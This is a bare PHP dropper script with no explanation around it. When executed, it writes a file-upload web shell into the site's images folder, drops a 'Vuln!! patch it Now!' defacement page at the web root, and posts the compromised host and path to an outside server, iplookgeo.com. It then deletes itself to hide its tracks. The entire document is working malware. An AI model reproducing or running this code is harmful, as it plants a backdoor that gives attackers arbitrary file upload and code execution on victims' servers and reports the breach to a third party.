<title>Vuln!!</title>

<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$s = '<title>Vuln!! patch it Now!</title><?php echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';if( $_POST["_upl"] == "Upload" ) {if(@copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])) { echo "<b>Shell Uploaded ! :)<b><br><br>"; }else { echo "<b>Not uploaded ! </b><br><br>"; }}?>';
$check = $_SERVER['DOCUMENT_ROOT'] . "/images/vuln.php" ;
$text = $s;
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
$ip = file_get_contents("http://iplookgeo.com/api/index.php", false, stream_context_create(array("http" => array("header" => "Content-Type: application/x-www-form-urlencoded", "method" => "POST", "content" => http_build_query(array("1" => $_SERVER["HTTP_HOST"] . $_SERVER["PHP_SELF"]))))));
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;

$check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
$text2 = 'Vuln!! patch it Now!';
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."</br>";
}else 
  echo "not exits";
echo "done .\n " ;
@unlink(__FILE__);
?>